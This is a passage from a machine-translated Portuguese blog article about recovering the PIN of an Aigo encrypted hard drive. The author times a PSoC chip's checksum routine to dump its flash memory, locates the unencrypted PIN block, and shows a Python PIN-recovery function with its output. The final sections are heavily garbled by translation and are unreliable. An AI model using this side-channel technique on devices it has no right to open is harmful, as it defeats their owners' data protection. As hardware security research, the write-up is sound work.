este seja algum tipo de vari√°vel tempor√°ria usada pelo dispositivo l√≥gico aritm√©tico.  Preste aten√ß√£o ao feio truque que eu reinicio o Arduino usando picocom quando o Arduino para de dar sinais de vida (n√£o fa√ßo ideia do porqu√™). </p><br><a name="a72"></a><br><h2 id="72-schityvaem-rezultat">  7.2  Leia o resultado </h2><br><p>  O resultado do script Python se parece com este (simplificado para facilitar a leitura): </p><br><pre> <code class="plaintext hljs">DELAY F1 F8 F9 # F1 ‚Äì    # F8     # F9     00000 03 E1 19 [...] 00016 F9 00 03 00016 F9 00 00 00016 F9 00 03 00016 F9 00 03 00016 F9 00 03 00016 F9 00 00 #     0 00017 FB 00 00 [...] 00023 F8 00 00 00024 80 80 00 # 1- : 0x0080-0x0000 = 0x80 00024 80 80 00 00024 80 80 00 [...] 00057 CC E7 00 # 2- : 0xE7-0x80: 0x67 00057 CC E7 00 00057 01 17 01 #   ,    00057 01 17 01 00057 01 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 F8 E7 00 #  E7? 00058 D0 17 01 [...] 00059 E7 E7 00 00060 17 17 00 #  [...] 00062 00 17 00 00062 00 17 00 00063 01 17 01 # , !        00063 01 17 01 [...] 00075 CC 17 01 # , 0x117-0xE7: 0x30</code> </pre> <br><p>  Ao mesmo tempo, temos um problema: como operamos na soma de verifica√ß√£o real, um byte zero n√£o altera o valor de leitura.  No entanto, como todo o procedimento de c√°lculo (8192 bytes) leva 0,1478 segundos (com pequenos desvios a cada inicializa√ß√£o), o que corresponde aproximadamente a 18,04 Œºs por byte, podemos usar esse tempo para verificar o valor da soma de verifica√ß√£o em momentos adequados.  Nas primeiras execu√ß√µes, tudo √© lido com muita facilidade, pois a dura√ß√£o do procedimento computacional √© sempre quase a mesma.  No entanto, o final desse despejo √© menos preciso, porque os "desvios insignificantes no tempo" a cada execu√ß√£o s√£o resumidos e se tornam significativos: </p><br><pre> <code class="plaintext hljs">134023 D0 02 DD 134023 CC D2 DC 134023 CC D2 DC 134023 CC D2 DC 134023 FB D2 DC 134023 3F D2 DC 134023 CC D2 DC 134024 02 02 DC 134024 CC D2 DC 134024 F9 02 DC 134024 03 02 DD 134024 21 02 DD 134024 02 D2 DC 134024 02 02 DC 134024 02 02 DC 134024 F8 D2 DC 134024 F8 D2 DC 134025 CC D2 DC 134025 EF D2 DC 134025 21 02 DD 134025 F8 D2 DC 134025 21 02 DD 134025 CC D2 DC 134025 04 D2 DC 134025 FB D2 DC 134025 CC D2 DC 134025 FB 02 DD 134026 03 02 DD 134026 21 02 DD</code> </pre> <br><p>  S√£o 10 despejos para cada atraso de microssegundo.  O tempo total de opera√ß√£o para descarregar todos os 8192 bytes de uma unidade flash √© de aproximadamente 48 horas. </p><br><a name="a73"></a><br><h2 id="73-rekonstrukciya-flesh-binarnika">  7.3  Reconstru√ß√£o do bin√°rio flash </h2><br><p>  Ainda n√£o terminei de escrever um c√≥digo que reconstrua completamente o c√≥digo do programa da unidade flash, levando em considera√ß√£o todos os desvios no tempo.  No entanto, eu j√° restaurei o in√≠cio desse c√≥digo.  Para garantir que eu fiz corretamente, desmontei-o usando o m8cdis: </p><br><pre> <code class="plaintext hljs">0000: 80 67 jmp 0068h ; Reset vector [...] 0068: 71 10 or F,010h 006a: 62 e3 87 mov reg[VLT_CR],087h 006d: 70 ef and F,0efh 006f: 41 fe fb and reg[CPU_SCR1],0fbh 0072: 50 80 mov A,080h 0074: 4e swap A,SP 0075: 55 fa 01 mov [0fah],001h 0078: 4f mov X,SP 0079: 5b mov A,X 007a: 01 03 add A,003h 007c: 53 f9 mov [0f9h],A 007e: 55 f8 3a mov [0f8h],03ah 0081: 50 06 mov A,006h 0083: 00 ssc [...] 0122: 18 pop A 0123: 71 10 or F,010h 0125: 43 e3 10 or reg[VLT_CR],010h 0128: 70 00 and F,000h ; Paging mode changed from 3 to 0 012a: ef 62 jacc 008dh 012c: e0 00 jacc 012dh 012e: 71 10 or F,010h 0130: 62 e0 02 mov reg[OSC_CR0],002h 0133: 70 ef and F,0efh 0135: 62 e2 00 mov reg[INT_VC],000h 0138: 7c 19 30 lcall 1930h 013b: 8f ff jmp 013bh 013d: 50 08 mov A,008h 013f: 7f ret</code> </pre> <br><p>  Parece bastante cr√≠vel! </p><br><a name="a74"></a><br><h2 id="74-nahodim-adres-hraneniya-pinkoda">  7.4  Encontre o endere√ßo de armazenamento do c√≥digo PIN </h2><br><p>  Agora que podemos ler a soma de verifica√ß√£o no momento em que precisamos, podemos verificar facilmente como e onde ela muda quando: </p><br><ul><li>  digite o c√≥digo errado; </li><li>  mude o c√≥digo PIN. </li></ul><br><p>  Primeiro, para encontrar o endere√ßo de armazenamento aproximado, fiz um despejo de soma de verifica√ß√£o em incrementos de 10 ms ap√≥s uma reinicializa√ß√£o.  Ent√£o entrei no c√≥digo PIN errado e fiz o mesmo. </p><br><p>  O resultado n√£o foi muito agrad√°vel, pois houve muitas mudan√ßas.  Mas, no final, pude estabelecer que a soma de verifica√ß√£o mudou em algum lugar no intervalo entre 120.000 ¬µs e 140.000 ¬µs de atraso.  Mas o ‚Äúc√≥digo PIN‚Äù que cheguei l√° estava completamente errado - devido ao artefato delayMicroseconds do procedimento, que faz coisas estranhas quando obt√©m 0. </p><br><p>  Depois de passar quase tr√™s horas, lembrei que a chamada do sistema CheckSum SROM na entrada recebe um argumento especificando o n√∫mero de blocos para a soma de verifica√ß√£o!  T.O.  podemos localizar facilmente o endere√ßo de armazenamento do c√≥digo PIN e o contador de "tentativas incorretas", precisas para o bloco de 64 bytes. </p><br><p>  Minhas execu√ß√µes iniciais deram o seguinte resultado: </p><br><p><img src="https://habrastorage.org/webt/0n/ol/xc/0nolxcgp8espvfdubrhrmvmbgrg.png"></p><br><p>  Ent√£o mudei o c√≥digo PIN de "123456" para "1234567" e recebi: </p><br><p><img src="https://habrastorage.org/webt/0r/zp/s2/0rzps2e2mwldmhtot1tswiv7mdq.png"></p><br><p>  Assim, o c√≥digo PIN e o contador de tentativas incorretas parecem estar armazenados no bloco n¬∫ 126. </p><br><a name="a75"></a><br><h2 id="75-snimaem-damp-bloka-126">  7.5  N√≥s removemos o despejo do bloco n ¬∞ 126 </h2><br><p>  O bloco n¬∫ 126 deve estar localizado em algum lugar na regi√£o de 125x64x18 = 144000mks, desde o in√≠cio do c√°lculo da soma de verifica√ß√£o, no meu despejo completo, e parece bastante cr√≠vel.  Ent√£o, depois de selecionar manualmente v√°rios dumps inv√°lidos (devido ao ac√∫mulo de "pequenos desvios no tempo"), finalmente obtive esses bytes (com um atraso de 145527 Œºs): </p><br><p><img src="https://habrastorage.org/webt/ji/31/ye/ji31yewphovunymnjxp0fcpwrdw.png"></p><br><p>  √â claro que o c√≥digo PIN √© armazenado em forma n√£o criptografada!  √â claro que esses valores n√£o est√£o escritos em c√≥digos ASCII, mas, como se v√™, refletem as leituras obtidas no teclado capacitivo. </p><br><p>  Por fim, executei mais alguns testes para descobrir onde o contador de tentativas incorretas est√° armazenado.  Aqui est√° o resultado: </p><br><p><img src="https://habrastorage.org/webt/dc/r5/tf/dcr5tf0yevdxcg5lyrbcr9srowu.png"></p><br><p>  0xFF - significa "15 tentativas" e diminui a cada tentativa incorreta. </p><br><a name="a76"></a><br><h2 id="76-vosstanovlenie-pinkoda">  7.6  Recupera√ß√£o Pincode </h2><br><p>  Aqui est√° o meu c√≥digo feio que re√∫ne todos os itens acima: </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump_pin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> pin_map = {<span class="hljs-number"><span class="hljs-number">0x24</span></span>: <span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-number"><span class="hljs-number">0x25</span></span>: <span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-number"><span class="hljs-number">0x26</span></span>: <span class="hljs-string"><span class="hljs-string">"2"</span></span>, <span class="hljs-number"><span class="hljs-number">0x27</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>, <span class="hljs-number"><span class="hljs-number">0x20</span></span>: <span class="hljs-string"><span class="hljs-string">"4"</span></span>, <span class="hljs-number"><span class="hljs-number">0x21</span></span>: <span class="hljs-string"><span class="hljs-string">"5"</span></span>, <span class="hljs-number"><span class="hljs-number">0x22</span></span>: <span class="hljs-string"><span class="hljs-string">"6"</span></span>, <span class="hljs-number"><span class="hljs-number">0x23</span></span>: <span class="hljs-string"><span class="hljs-string">"7"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2c</span></span>: <span class="hljs-string"><span class="hljs-string">"8"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2d</span></span>: <span class="hljs-string"><span class="hljs-string">"9"</span></span>} last_csum = <span class="hljs-number"><span class="hljs-number">0</span></span> pin_bytes = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">145495</span></span>, <span class="hljs-number"><span class="hljs-number">145719</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>): csum = csum_at(delay, <span class="hljs-number"><span class="hljs-number">1</span></span>) byte = (csum-last_csum)&amp;<span class="hljs-number"><span class="hljs-number">0xFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"%05d %04x (%04x) =&gt; %02x"</span></span> % (delay, csum, last_csum, byte) pin_bytes.append(byte) last_csum = csum <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"PIN: "</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(pin_bytes)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pin_bytes[i] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> pin_map: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> pin_map[pin_bytes[i]], <span class="hljs-keyword"><span class="hljs-keyword">print</span></span></code> </pre> <br><p>  Aqui est√° o resultado de sua execu√ß√£o: </p><br><pre> <code class="plaintext hljs">$ ./psoc.py syncing: KO OK Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK 145495 53e2 (0000) =&gt; e2 145511 5407 (53e2) =&gt; 25 145527 542d (5407) =&gt; 26 145543 5454 (542d) =&gt; 27 145559 5474 (5454) =&gt; 20 145575 5495 (5474) =&gt; 21 145591 54b7 (5495) =&gt; 22 145607 54da (54b7) =&gt; 23 145623 5506 (54da) =&gt; 2c 145639 5506 (5506) =&gt; 00 145655 5533 (5506) =&gt; 2d 145671 554c (5533) =&gt; 19 145687 554e (554c) =&gt; 02 145703 554e (554e) =&gt; 00 PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  Viva!  Isso funciona! </p><br><p>  Observe que os valores de atraso usados ‚Äã‚Äãpor mim s√£o provavelmente relevantes para um PSoC espec√≠fico - o que eu usei. </p><br><a name="a8"></a><br><h1 id="8-chto-dalshe">  8. O que vem depois? </h1><br><p> ,     PSoC,     Aigo: </p><br><ul><li>    SRAM,      ; </li><li>      ,   ¬´   ¬ª,    . </li></ul><br><p>   ,       ‚Äì -   .       : </p><br><ul><li>       ,      ¬´   ¬ª; </li><li>  FPGA-       (    Arduino); </li><li>    :    ,     RAM,   ,       RAM,  .   Arduino    - ,    Arduino  5 ,            3,3 . </li></ul><br><p>   ,      ‚Äì   ,     .     ,         , ‚Äì  ,          . </p><br><p>  SROM,        ReadBlock,       ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="></a>     ‚Äì     ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">¬´REcon Brussels 2017¬ª</a> . </p><br><p>    ,      ‚Äì    :    SRAM,      . </p><br><a name="a9"></a><br><h1 id="9-zaklyuchenie"> 9.  </h1><br><p> ,      ,         ( ¬´¬ª) ‚Ä¶      (),         ! </p><br><p>     Aigo?  -   HDD-,   2015   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="></a>  SyScan,        HDD-,   ,       . :-) </p><br><p>          .     40 .     (   )    ( ).    40   ,       .    . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt455529/">https://habr.com/ru/post/pt455529/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt455517/index.html">Formado no curso de Netologia ‚ÄúData Science‚Äù sobre seu trabalho no setor banc√°rio</a></li>
<li><a href="../pt455519/index.html">Como implementamos a integra√ß√£o de novos desenvolvedores</a></li>
<li><a href="../pt455523/index.html">Implementa√ß√£o da interface do usu√°rio do OpenStack LBaaS</a></li>
<li><a href="../pt455525/index.html">Zimbra e Mail Bomb Defense</a></li>
<li><a href="../pt455527/index.html">O que est√° escrito nisso? Nos bastidores dos objetos JavaScript</a></li>
<li><a href="../pt455533/index.html">F√≠sica da bolha: uma busca pelo mecanismo de destrui√ß√£o da espuma</a></li>
<li><a href="../pt455535/index.html">Gerenciando certificados SSL / TLS nas nuvens e cont√™ineres - n√£o no trabalho humano</a></li>
<li><a href="../pt455537/index.html">Otimiza√ß√£o de pesquisa ampla: como processar um gr√°fico com 10 bilh√µes de estados</a></li>
<li><a href="../pt455539/index.html">Videntes m√≥veis: 10 fatos novos sobre como os dispositivos vest√≠veis est√£o observando voc√™</a></li>
<li><a href="../pt455543/index.html">O Kubernetes Cluster √© f√°cil e conveniente de preparar? Anunciar addon-operator</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>